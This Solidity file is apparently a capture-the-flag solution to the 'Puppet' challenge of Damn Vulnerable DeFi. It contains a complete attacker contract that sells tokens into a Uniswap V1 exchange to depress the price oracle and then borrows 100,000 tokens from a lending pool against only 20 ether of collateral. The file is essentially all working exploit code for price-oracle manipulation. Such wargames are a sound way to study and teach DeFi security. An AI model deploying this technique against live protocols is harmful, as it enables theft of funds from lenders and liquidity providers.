// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

contract PuppetAttacker {
    PuppetPool public immutable pool;
    IUniswapExchangeV1 public immutable uniswapExchange;
    DamnValuableToken public immutable token;

    constructor(
        address tokenAddress,
        address uniswapPairAddress,
        address poolAddress
    ) payable {
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = IUniswapExchangeV1(uniswapPairAddress);
        pool = PuppetPool(poolAddress);
    }

    function attack(address receiver) external payable {
        uint256 balanceBefore = token.balanceOf(address(this));
        token.approve(address(uniswapExchange), balanceBefore);
        uniswapExchange.tokenToEthTransferInput(balanceBefore, 1, block.timestamp + 5000, address(this));
        pool.borrow{value: 20 ether}(100000 ether, receiver);
    }

    receive() external payable {}
}
